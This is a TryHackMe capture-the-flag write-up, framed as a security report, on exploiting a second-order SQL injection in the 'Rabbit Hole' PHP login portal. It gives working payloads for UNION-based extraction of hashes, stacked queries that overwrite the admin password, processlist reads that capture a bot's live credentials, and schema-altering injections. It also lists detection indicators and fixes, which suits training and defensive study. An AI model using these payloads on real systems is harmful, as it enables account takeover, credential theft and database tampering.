
# Rabbit Hole  - Technical Report

> **Platform:** TryHackMe \
> **Difficulty:** `Hard` \
> **Date:** 2026-03-09 \
> **Author:** 0N1S3C \
> **Scope:** Authorized lab environment only

---

## 0. Executive Summary

The "Rabbit Hole" machine was found to contain a second-order SQL injection vulnerability in its user registration and login portal. An unauthenticated attacker could register an account with a malicious username, which is later executed unsanitised when the dashboard queries login history. This allowed full database enumeration, stacked query execution, and ultimately interception of an admin bot's live credentials via `information_schema.processlist`. The recovered credentials granted SSH access and retrieval of the user flag. The machine's name is literal — numerous convincing false paths exist by design to trap attackers. Immediate remediation of input sanitisation, parameterised queries, and database user privilege restrictions is recommended.

---

## 1. Introduction

This report documents the structured analysis and controlled exploitation of the **"Rabbit Hole"** machine on TryHackMe.

**Objectives:**
- Obtain user-level access
- Obtain the flag

**Methodology:** Assessments follow the standardized approach defined in `methodology.md`.

---

## 2. Attack Chain

```
Nmap → Apache/PHP login portal → Second-Order SQLi (username field)
→ UNION injection → stacked queries → information_schema.processlist
→ Admin bot credential interception → SSH as admin → flag.txt
```

---

## 3. Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning & service detection |
| `gobuster` | Directory & authenticated directory enumeration |
| `burpsuite` | Request interception, manual injection |
| `hashcat` | Hash cracking attempts (unsuccessful — rabbit hole) |
| `curl` | Manual session-based requests |

---

## 4. Reconnaissance

### 4.1 Initial Network Scan

**Commands:**
```bash
nmap -sC -sV -Pn -T4 10.114.181.197
```

**Findings:**

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 22/tcp | SSH | OpenSSH 8.9p1 | Standard SSH |
| 80/tcp | HTTP | Apache 2.4.59 (Debian) | PHP app, PHPSESSID cookie without HttpOnly flag |

**Key Observations:**
- PHP session cookie (`PHPSESSID`) missing the `HttpOnly` flag — noted but ultimately a rabbit hole
- Default page title `"Your page title here :)"` — placeholder template, minimal custom development
- Small attack surface: all entry points through the web application

---

## 5. Service Enumeration

### 5.1 Web Enumeration

**Commands:**
```bash
gobuster dir -u http://rabbithole.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
gobuster dir -u http://rabbithole.thm -w /usr/share/wordlists/dirb/common.txt -x php -c "PHPSESSID=<session>"
```

**Findings:**
- `/register.php` — user registration form (username + password)
- `/login.php` — login form
- `/logout.php` — session logout
- `/css/` — static assets only
- No hidden admin panels, no additional PHP files discovered — authenticated gobuster scan confirmed

**Page source review:**
The index page contained a prominent warning:
> *"There are anti-bruteforce measures in place. Login functionality is actively monitored."*

This is intentional misdirection — the intended path does not involve bruteforcing the login.

---

## 6. Initial Access

### 6.1 Vulnerability Identification

**Vulnerability:** Second-Order SQL Injection via username field
**Location:** `/register.php` → stored → triggered on `/index.php` dashboard query
**Reasoning:** After registering and logging in, the dashboard displayed a "Last logins" table with the format `User [id] - [username] last logins`. The username was reflected directly into the page without sanitisation. The underlying query fetching login timestamps used the stored username unsanitised, enabling injection at render time rather than at insertion time (second-order / stored SQLi).

**Confirmed via:**
```sql
-- Stored at registration, injected at query time:
' -- -
/" UNION SELECT 1,2 -- -
-- Returned: SQLSTATE[21000]: Cardinality violation: 1222
-- Confirmed: injection point active, 2-column result set
```

**Note on quote style:** Single-quoted injections were stored literally (sanitised at insert). Double-quote prefix (`/"`) bypassed this and achieved injection — the query used double-quoted identifiers.

### 6.2 Exploitation — Database Enumeration

```sql
-- Column count confirmation
/" UNION SELECT 1,2 -- -

-- Table enumeration
/" UNION SELECT 1,table_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema=DATABASE() -- -
-- Result: users, logins

-- Column enumeration (users table)
/" UNION SELECT 1,column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='users' -- -
-- Result: id, username, password, group

-- Data extraction (truncated at 16 chars — used SUBSTRING to recover full 32-char MD5)
/" UNION SELECT 1,substring(password,1,16) FROM users WHERE username='admin' -- -
/" UNION SELECT 1,substring(password,17,16) FROM users WHERE username='admin' -- -

-- Group enumeration
/" UNION SELECT 1,concat(username,':',`group`) FROM users -- -
-- Result: admin:admin, foo:guest, bar:guest
-- Note: `group` is a reserved word in MariaDB — backticks required
```

**Database server identified:** MariaDB (confirmed via error messages)

### 6.3 Exploitation — Stacked Queries

```sql
-- Confirmed stacked query execution:
/" ; UPDATE users SET `group`='admin' WHERE username='test' -- -
-- Verified: group column updated to 'admin' for test user

-- Admin account takeover:
/" ; UPDATE users SET password=MD5('hacked') WHERE username='admin' -- -
-- Then logged in as admin:hacked
```

### 6.4 Exploitation — Processlist Interception

An admin bot was periodically logging into the application. Its live query — including the plaintext password — was visible in `information_schema.processlist` during execution.

The following payload was registered as a username to extract the bot's query in 16-character chunks:

```sql
" union ALL select 0,SUBSTR(info,1,16) from information_schema.processlist where info not like "%info%"
union ALL select 0,SUBSTR(info,17,16) from information_schema.processlist where info not like "%info%"
-- [continued through offset 193]
-- -
```

After logging in repeatedly to catch the bot mid-execution, the processlist revealed:

```
SELECT * from users where (username= 'admin' and password=md5('[REDACTED]'))
UNION ALL SELECT null,null,null,SLEEP(5) LIMIT 2
```

The admin password was recovered from the live query fragments.

**Result:** SSH credentials obtained for `admin`.

---

## 7. Lateral Movement

Not applicable — initial access via SSH as `admin` was the final step before flag retrieval.

---

## 8. Privilege Escalation

### 8.1 Flag Retrieval

```bash
ssh admin@10.114.181.197
ls ~
cat ~/flag.txt
```

**Flag obtained.**

No privilege escalation required — the flag was in the admin home directory.

---

## 9. Findings Summary

| # | Finding | Severity | Location |
|---|---------|----------|----------|
| 1 | Second-order SQL injection via username field | 🔴 Critical | `/register.php` → `/index.php` |
| 2 | Stacked queries enabled — arbitrary DML execution | 🔴 Critical | MariaDB configuration |
| 3 | Admin bot credentials visible in `information_schema.processlist` | 🔴 Critical | MariaDB processlist |
| 4 | Plaintext password passed in SQL query (MD5 of password in query string) | 🟠 High | Login query logic |
| 5 | Database user has `PROCESS` privilege — processlist readable by app user | 🟠 High | MariaDB user permissions |
| 6 | PHPSESSID cookie missing `HttpOnly` flag | 🔵 Low | HTTP response headers |
| 7 | Verbose SQL error messages returned to user | 🟡 Medium | PHP error handling |
| 8 | `group` column name collision with SQL reserved word | ⚪ Info | Database schema design |

**Severity Scale:**
`🔴 Critical` → `🟠 High` → `🟡 Medium` → `🔵 Low` → `⚪ Info`

---

## 10. Defensive Considerations

### 10.1 Indicators of Compromise

- Registration requests with SQL syntax in the username field (`UNION`, `SELECT`, `--`, `/"`)
- Unusually long usernames in registration POST requests
- High volume of register+login cycles from a single IP
- `information_schema.processlist` queries in database logs
- `UPDATE users SET password=` statements in slow query / general logs
- SSH login from unexpected source IP as `admin`

### 10.2 Security Weaknesses

- Username inserted into database without parameterisation, then re-used unsanitised in a subsequent query (classic second-order SQLi pattern)
- Stacked queries enabled on the MariaDB instance used by the application
- Application database user granted `PROCESS` privilege — unnecessary for a login portal
- Admin bot authenticates by passing credentials directly in a SQL query visible to other sessions
- Verbose database error messages (`SQLSTATE[...]`) returned to the client, revealing query structure and database type
- `HttpOnly` flag missing on session cookie

### 10.3 Hardening Recommendations

| Priority | Recommendation | Finding |
|----------|---------------|---------|
| Immediate | Use parameterised queries / prepared statements for all database interactions | Finding 1 |
| Immediate | Revoke `PROCESS` privilege from application database user | Finding 5 |
| Immediate | Disable stacked queries at the application layer (PDO: `PDO::MYSQL_ATTR_MULTI_STATEMENTS => false`) | Finding 2 |
| Immediate | Suppress SQL error messages from user-facing responses — log server-side only | Finding 7 |
| Short-term | Redesign admin bot authentication to use session tokens, not raw SQL credential queries | Finding 3 |
| Short-term | Implement `HttpOnly` and `Secure` flags on all session cookies | Finding 6 |
| Short-term | Apply principle of least privilege to all database users | Finding 5 |
| Long-term | Implement a WAF rule to flag SQL keywords in registration/login inputs | Finding 1 |
| Long-term | Rename reserved-word columns in the database schema | Finding 8 |

---

## 11. Rabbit Holes (Documented)

This box is explicitly designed to waste time. The following paths were investigated and confirmed as dead ends:

| Rabbit Hole | Why It Looked Promising | Why It Failed |
|-------------|------------------------|---------------|
| **Brute forcing login** | Standard first instinct | Page explicitly warns against it; not the intended path |
| **PHPSESSID = MD5(username)** | Cookie was 32 hex chars; MD5 shaped | `MD5("test") != PHPSESSID` — coincidental length |
| **PHP magic hash / type juggling** | Admin hash `0e3ab8e4...` starts with `0e` followed by digits | Login form doesn't use `==` comparison; password not crackable via magic hash login |
| **Cracking foo/bar hashes** | Recovered MD5s from users table | Hashes not in rockyou.txt; cracking was never the path |
| **`load_file()` for source code / flag** | Had SQLi, `load_file` is a natural next step | `rabbit` DB user had no `FILE` privilege |
| **`INTO OUTFILE` webshell** | Standard SQLi-to-RCE path | Same `FILE` privilege restriction |
| **Injecting `group='admin'` via password field** | App hashes password before insert | Hash of injection string stored, not the injection itself |
| **Injecting via username to set group=admin at INSERT** | Logical second attempt | Single quotes escaped at registration INSERT — stored literally |
| **Second open ports** | Always worth checking | Only 22 and 80; 998 ports closed |
| **XSS** | Reflected username in dashboard | No bot visiting pages to steal cookies from; no XSS sink that matters |
| **Authenticated gobuster for hidden admin pages** | Admin group must unlock *something* | No hidden pages — admin group only changes dashboard query scope |
| **Additional databases via INFORMATION_SCHEMA.SCHEMATA** | Multi-database setups are common | Only the application database present |
| **logins table containing the flag** | Unexplored table | Only `username` and `login_time` columns; no flag data |

---

## 12. Alternative Exploitation Approaches

Beyond the intended processlist interception, the following alternative approaches were identified during exploitation:

### 12.1 Schema Alteration Attack (Most Creative)

```python
# Modify the id column type to VARCHAR, then UPDATE admin's id
# with the live processlist query result
payload = '" UNION SELECT 1,2; ALTER TABLE web.users MODIFY id VARCHAR(255); \
           ALTER TABLE web.users DROP PRIMARY KEY;#'

# Then overwrite admin's id with the captured query:
payload = '" UNION SELECT 1,2; UPDATE web.users SET id=(\
           SELECT IFNULL(GROUP_CONCAT(INFO_BINARY),"1") \
           FROM information_schema.PROCESSLIST \
           WHERE INFO_BINARY NOT LIKE "%INFO_BINARY%") \
           WHERE username="admin";#'

# Poll until admin's displayed User ID changes from "1" to the captured query
# Then clean up — restore schema to original state
```

This approach alters the table schema to store the full processlist output in the `id` column, polls for the bot's login, extracts credentials from the rendered page, then restores the database to its original state — including re-adding the primary key.

### 12.2 Session-Based Script (Intended)

The room's intended solve uses a bash script that iterates numeric PHPSESSID values to reconstruct the flag from multiple sessions — though this approach was superseded by the SQLi path.

---

## 13. Lessons Learned

- **The room name is the hint.** Every time exploitation felt like it was going deeper without progress, that was the signal to step back. The box is specifically designed to punish over-engineering.
- **Read the page source before anything else.** The anti-bruteforce warning and the dashboard content were the two most important observations — both visible before any tooling.
- **Second-order SQLi requires patience.** Injection fires at query time, not at insert time. Every new payload required a full register → login → observe cycle.
- **Double quotes matter.** Single-quoted injection was sanitised at the INSERT level. The `/"` prefix bypassed this. Testing alternate quote styles is worth the extra minute.
- **`information_schema.processlist` is a real attack surface.** Overprivileged database users can expose live queries — including credentials — to other sessions. This is a genuine and underappreciated finding in real environments.
- **`group` is a reserved word in MariaDB.** Backtick it, or you'll spend time debugging a syntax error that isn't your injection.
- **Stacked queries open significant escalation paths.** Once stacked queries were confirmed, arbitrary DML (UPDATE, ALTER, DELETE) became available — not just SELECT-based data exfiltration.
- **Don't stop at the first working vector.** Multiple exploitation paths existed here. Exploring alternatives after the box is solved is one of the most efficient ways to learn.

---

*End of Report*
*Classification: Public — flags and sensitive values omitted*
